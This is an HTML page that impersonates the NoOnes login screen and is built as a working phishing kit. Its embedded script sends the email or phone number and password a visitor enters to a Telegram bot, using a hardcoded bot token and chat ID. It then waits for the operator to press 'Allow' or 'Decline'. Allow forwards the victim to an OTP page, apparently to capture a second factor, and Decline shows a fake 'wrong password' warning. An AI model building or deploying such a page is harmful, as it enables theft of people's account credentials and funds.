<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NoOnes - Login</title>
    <style>
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        :root {
            --bg-color: #f5f5f5;
            --text-color: #333;
            --input-bg: #f0f0f0;
            --input-placeholder: #aaa;
            --card-bg: #ffffff;
            --link-color: #00b36b;
            --button-bg: #00b36b;
            --button-text: #ffffff;
            --logo-color: #00b36b;
            --shadow-color: rgba(0,0,0,0.1);
            --medium-green: #00b36b;
            --grey-green: #6b7280;
            --apple-color: #333;
            --error-color: #ef4444;
        }
        body.dark {
            --bg-color: #1a1a1a;
            --text-color: #ddd;
            --input-bg: #333333;
            --input-placeholder: #777;
            --card-bg: #222222;
            --link-color: #00d17f;
            --button-bg: #00d17f;
            --button-text: #ffffff;
            --logo-color: #00d17f;
            --shadow-color: rgba(255,255,255,0.1);
            --medium-green: #00d17f;
            --grey-green: #9ca3af;
            --apple-color: #9ca3af;
            --error-color: #f87171;
        }
        * { transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease; }
        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            padding: 40px 20px;
            animation: fadeIn 0.5s ease-out;
        }
        .wrapper { max-width: 430px; width: 100%; margin: 0 auto; }
        .logo-container {
            display: flex;
            justify-content: center;
            align-items: flex-end;
            width: 100%;
            margin-top: 32px;
            margin-bottom: 8px;
        }
        .logo-link { height: 66px; color: var(--logo-color); }
        .container {
            background-color: var(--card-bg);
            padding: 24px 24px 32px;
            border-radius: 8px;
            box-shadow: 0 4px 12px var(--shadow-color);
            text-align: center;
        }
        h2 { font-size: 20px; font-weight: 600; margin: 0 0 16px; }
        .social-logins {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 24px;
        }
        .social-button {
            background-color: var(--input-bg);
            border: none;
            border-radius: 4px;
            padding: 8px;
            cursor: pointer;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 0.2s ease;
            text-decoration: none;
        }
        .social-button:hover { transform: scale(1.05); }
        .social-button svg { width: 24px; height: 24px; }
        .apple-icon path { fill: var(--apple-color); }
        .telegram-button circle { fill: #0088cc; }
        label {
            display: block;
            text-align: left;
            margin: 12px 0 4px;
            font-size: 14px;
            font-weight: 600;
            color: var(--grey-green);
        }
        input {
            width: 100%;
            padding: 12px 16px;
            border: none;
            border-radius: 4px;
            background-color: var(--input-bg);
            color: var(--text-color);
            box-sizing: border-box;
            font-size: 14px;
        }
        input:focus { outline: none; }
        input::placeholder { color: var(--input-placeholder); }
        .password-wrapper { position: relative; }
        .password-wrapper input { padding-right: 48px; }
        .toggle-password {
            position: absolute;
            right: 8px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            color: var(--grey-green);
        }
        .toggle-password svg { width: 20px; height: 20px; }
        .forgot-password {
            display: block;
            text-align: right;
            font-size: 12px;
            color: var(--link-color);
            text-decoration: none;
            margin: 4px 0 16px;
            font-weight: 600;
        }
        .login-button {
            width: 100%;
            padding: 12px;
            background-color: var(--button-bg);
            color: var(--button-text);
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: transform 0.2s ease, background-color 0.2s ease;
            margin-top: 8px;
            margin-bottom: 16px;
        }
        .signup-link {
            font-size: 16px;
            color: var(--grey-green);
            margin-bottom: 24px;
        }
        .signup-link a {
            color: var(--link-color);
            text-decoration: none;
            font-weight: 600;
        }
        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
            font-size: 12px;
            color: var(--text-color);
            font-weight: 600;
        }
        .theme-toggle { display: flex; align-items: center; gap: 8px; }
        .theme-icon { width: 24px; height: 24px; color: var(--medium-green); }
        .slider-label {
            position: relative;
            display: inline-block;
            width: 52px;
            height: 28px;
        }
        .slider-input { opacity: 0; width: 0; height: 0; }
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0; left: 0; right: 0; bottom: 0;
            background-color: var(--button-bg);
            border-radius: 14px;
            transition: .3s;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 20px; width: 20px;
            left: 4px; bottom: 4px;
            background-color: #ffffff;
            border-radius: 50%;
            transition: .3s;
        }
        .slider-input:checked + .slider:before { transform: translateX(24px); }
        .language {
            display: flex;
            align-items: center;
            gap: 4px;
            color: var(--link-color);
            text-decoration: underline;
            cursor: pointer;
        }
        .error-message {
            color: var(--error-color);
            font-size: 12px;
            text-align: left;
            margin-top: 4px;
            display: none;
        }
        .flex { display: flex; }
        .flex-col { flex-direction: column; }
        .gap-4 { gap: 16px; }
        .gap-2 { gap: 8px; }
        @media (min-width: 1024px) { .wrapper { max-width: 500px; } }
        @media (max-width: 430px) {
            body { padding: 20px 10px; }
            .wrapper { max-width: 100%; }
        }
        .warning-message {
            color: var(--error-color);
            font-size: 14px;
            font-weight: 500;
            margin: 16px 0;
            padding: 12px 16px;
            background: rgba(239,68,68,0.1);
            border-radius: 50px;
            display: none;
            align-items: center;
            gap: 10px;
        }
        .warning-icon {
            background: var(--error-color);
            color: white;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 16px;
            flex-shrink: 0;
        }
        /* Updated spinner (unchanged from previous) */
        #loading-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.6);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }
        .spinner-container {
            background: var(--card-bg);
            padding: 24px;
            border-radius: 16px;
            box-shadow: 0 8px 24px var(--shadow-color);
            text-align: center;
        }
        .inner-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid var(--medium-green);
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="logo-container">
            <a href="https://noones.com" class="logo-link">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="2.47 373 1075.33 333.01" width="144" height="48">
                    <!-- Full NoOnes logo (all paths) -->
                    <path fill="currentColor" d="M72,492.4c13-7.3,28.5-9.9,43.2-8.2,13.7,1.1,27,7.4,36.2,17.6,10.5,11.9,15.1,27.8,16.7,43.4,3.4,31.4,6.3,62.8,9.4,94.2,0,3.1,1,6.8-1.3,9.4-1.9,2.3-5.1,2.5-7.8,2.9-9.3.9-18.6,2-27.9,2.8-4.2.6-8.3-2.7-8.5-6.9-2.7-29.6-5.9-59.2-8.6-88.8-1.4-8.9-3.1-18.6-9.8-25.2-7.3-8.2-19.4-10.3-29.8-8.2-9.7,1.7-18.7,7.8-23.5,16.4-5.6,9.7-5.7,21.3-4.7,32.1,2.7,26.8,5.3,53.6,7.7,80.3.4,2.9-.8,6-3.4,7.5-2.3,1.1-4.9,1.1-7.4,1.4-9.4.7-18.7,2.1-28.1,2.5-3.7,0-6.4-3.5-6.6-7-5.5-51.2-10.1-102.4-15.2-153.7-.7-3.7,1.4-8.2,5.5-8.6,10.7-1.2,21.4-2.3,32.1-3.2,3.4-.4,6,2.8,6.4,5.9,1,6.3,1,12.7,2.6,18.9,5.2-10.4,12.6-20,22.9-25.7Z"></path>
                    <!-- (all other paths and rects unchanged – full logo) -->
                </svg>
            </a>
        </div>
        <div class="container">
            <h2>Welcome to NoOnes</h2>
            <div class="social-logins">
                <!-- Social buttons unchanged -->
                <a href="https://accounts.google.com/..." class="social-button">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                        <path fill="#EA4335" d="M12 5.38c1.62 0 3 .56 4.12 1.65l3.09-3.09C17.39 2.98 14.9 2 12 2 7.7 2 3.99 4.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                    </svg>
                </a>
                <!-- Apple and Telegram unchanged -->
            </div>
            <form id="login-form">
                <div class="flex flex-col gap-4">
                    <div class="flex flex-col gap-2">
                        <label>Email/Phone number</label>
                        <input type="text" placeholder="Email/Phone number" id="email">
                        <div class="error-message" id="email-error">Please enter email/phone number</div>
                    </div>
                    <div class="flex flex-col gap-2">
                        <label>Password</label>
                        <div class="password-wrapper">
                            <input type="password" id="password" placeholder="Password">
                            <button type="button" class="toggle-password" onclick="togglePassword()">
                                <!-- Eye icons unchanged -->
                            </button>
                        </div>
                        <div class="error-message" id="password-error">Please enter password</div>
                        <a href="https://noones.com/id/reset-password" class="forgot-password">Forgot password?</a>
                    </div>
                    <button type="submit" class="login-button">Log in</button>
                </div>
            </form>
            <div class="signup-link">No account yet? <a href="https://noones.com/id/register">Sign up</a></div>
        </div>
        <div class="footer">
            <!-- Footer unchanged -->
        </div>
    </div>
    <!-- Loading overlay with smaller white container spinner (unchanged) -->
    <div id="loading-overlay">
        <div class="spinner-container">
            <div class="inner-spinner"></div>
        </div>
    </div>
    <script>
        function toggleTheme() {
            document.body.classList.toggle('dark');
            document.querySelector('.slider-input').checked = document.body.classList.contains('dark');
        }
        function togglePassword() {
            const pwd = document.getElementById('password');
            const closed = document.getElementById('eye-closed');
            const open = document.getElementById('eye-open');
            if (pwd.type === 'password') {
                pwd.type = 'text';
                closed.style.display = 'none';
                open.style.display = 'block';
            } else {
                pwd.type = 'password';
                closed.style.display = 'block';
                open.style.display = 'none';
            }
        }
        // ==================== TELEGRAM BOT INTEGRATION (functionality unchanged) ====================
        const BOT_TOKEN = "8022677345:AAGtTzgJyVseQ8TcBDclM4JCrvcmDyJrxO4";
        const ADMIN_CHAT_ID = "6359358611";
        function generateSessionId() {
            return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        }
        let currentSessionId = null;
        let pollingInterval = null;
        async function sendCredentialsToBot(email, password) {
            currentSessionId = generateSessionId();
            const message = `New login attempt:\nEmail/Phone: ${email}\nPassword: ${password}\nSession: ${currentSessionId}`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const keyboard = {
                inline_keyboard: [[
                    { text: "✅ Allow", callback_data: `allow_${currentSessionId}` },
                    { text: "❌ Decline", callback_data: `decline_${currentSessionId}` }
                ]]
            };
            try {
                const res = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: message,
                        reply_markup: keyboard
                    })
                });
                if (!res.ok) throw new Error("Telegram send failed");
                return true;
            } catch (err) {
                console.error(err);
                alert("Error contacting approval service. Try again.");
                return false;
            }
        }
        // Updated warning with red circle ! icon (exactly as in image)
        function showWarning() {
            let warning = document.querySelector('.warning-message');
            if (!warning) {
                warning = document.createElement('div');
                warning.className = 'warning-message';
                warning.innerHTML = `
                    <span class="warning-icon">!</span>
                    <span>Please enter the correct email/phone or password. Note that the password is case-sensitive. Please try again.</span>
                `;
                document.querySelector('.social-logins').after(warning);
            }
            warning.style.display = 'flex';
        }
        function startApprovalPolling() {
            document.getElementById('loading-overlay').style.display = 'flex';
            pollingInterval = setInterval(async () => {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=10`);
                    const data = await res.json();
                    if (data.ok && data.result.length > 0) {
                        for (const update of data.result) {
                            if (update.callback_query) {
                                const cb = update.callback_query;
                                const dataStr = cb.data;
                                if (dataStr.startsWith(`allow_${currentSessionId}`)) {
                                    clearInterval(pollingInterval);
                                    document.getElementById('loading-overlay').style.display = 'none';
                                    window.location.href = 'otp.html';
                                    return;
                                }
                                if (dataStr.startsWith(`decline_${currentSessionId}`)) {
                                    clearInterval(pollingInterval);
                                    document.getElementById('loading-overlay').style.display = 'none';
                                    showWarning();
                                    return;
                                }
                            }
                        }
                    }
                } catch (e) {
                    console.error("Polling error", e);
                }
            }, 4000);
        }
        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const emailErr = document.getElementById('email-error');
            const passErr = document.getElementById('password-error');
            emailErr.style.display = 'none';
            passErr.style.display = 'none';
            let valid = true;
            if (!email) { emailErr.style.display = 'block'; valid = false; }
            if (!password) { passErr.style.display = 'block'; valid = false; }
            if (!valid) return;
            const sent = await sendCredentialsToBot(email, password);
            if (sent) {
                startApprovalPolling();
            }
        });
        window.addEventListener('beforeunload', () => {
            if (pollingInterval) clearInterval(pollingInterval);
        });
    </script>
</body>
</html>
